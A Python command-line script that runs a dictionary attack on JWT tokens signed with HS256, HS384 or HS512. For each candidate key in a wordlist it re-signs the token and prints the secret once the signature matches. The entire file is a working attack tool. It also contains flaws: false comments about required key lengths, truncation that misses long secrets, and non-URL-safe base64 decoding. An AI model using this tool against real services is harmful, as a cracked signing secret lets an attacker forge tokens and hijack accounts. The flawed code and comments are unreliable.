import base64
import hashlib
import hmac
import jwt
import argparse
import json
import sys

def base64url_decode(base64url_str):
    padding = '=' * (-len(base64url_str) % 4)
    base64_str = base64url_str + padding
    return base64.b64decode(base64_str).decode('utf-8')

def decode_jwt_header(token):
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT token format")
    header = parts[0]
    decoded_header = base64url_decode(header)
    header_json = json.loads(decoded_header)
    return header_json

def pad_key(key, length):
    """Pad or truncate the key to the specified length."""
    key_bytes = key.encode('utf-8')
    if len(key_bytes) > length:
        return key_bytes[:length]  # Truncate if longer
    return key_bytes.ljust(length, b'\x00')  # Pad with zeros if shorter

def generate_signature(header, payload, secret, algorithm):
    encoded_header = base64.urlsafe_b64encode(header.encode()).rstrip(b'=').decode()
    encoded_payload = base64.urlsafe_b64encode(payload.encode()).rstrip(b'=').decode()
    data = f"{encoded_header}.{encoded_payload}"
    
    if algorithm == 'HS256':
        padded_key = pad_key(secret, 32)  # HS256 requires 32 bytes
        signature = hmac.new(padded_key, data.encode(), hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    elif algorithm == 'HS384':
        padded_key = pad_key(secret, 48)  # HS384 requires 48 bytes
        signature = hmac.new(padded_key, data.encode(), hashlib.sha384).digest()
        return base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    elif algorithm == 'HS512':
        padded_key = pad_key(secret, 64)  # HS512 requires 64 bytes
        signature = hmac.new(padded_key, data.encode(), hashlib.sha512).digest()
        return base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    else:
        raise NotImplementedError("Algorithm not supported")

def main():
    parser = argparse.ArgumentParser(description="Crack JWT signature using a dictionary file.")
    parser.add_argument("token", help="The JWT token to crack")
    parser.add_argument("dict_file", help="Path to the dictionary file with potential secret keys")
    
    args = parser.parse_args()
    
    token = args.token
    dict_file_path = args.dict_file

    try:
        header = decode_jwt_header(token)
        algorithm = header.get("alg")
        
        if algorithm not in ['HS256', 'HS384', 'HS512']:
            print("The algorithm is not supported for this script.")
            sys.exit(0)
        
        print(f"Detected JWT algorithm: {algorithm}")

    except Exception as e:
        print(f"Error decoding JWT header: {e}")
        return

    parts = token.split('.')
    if len(parts) != 3:
        print("Invalid JWT token format.")
        return

    encoded_header = base64url_decode(parts[0])
    encoded_payload = base64url_decode(parts[1])
    signature = parts[2]

    found_key = False
    print("Starting dictionary attack\n\n")
    with open(dict_file_path, 'r', encoding='utf-8', errors='ignore') as dict_file:
        for line in dict_file:
            key = line.strip()
            if not key:
                continue
            
            try:
                test_signature = generate_signature(encoded_header, encoded_payload, key, algorithm)
                
                if test_signature == signature:
                    print(f"Successfully cracked the signature with key: {key}")
                    found_key = True
                    break
                
                print(f"Failed with key: {key}")

            except Exception as e:
                print(f"Error generating signature: {e}")
    
    if not found_key:
        print("No valid key found in the dictionary.")

if __name__ == "__main__":
    main()
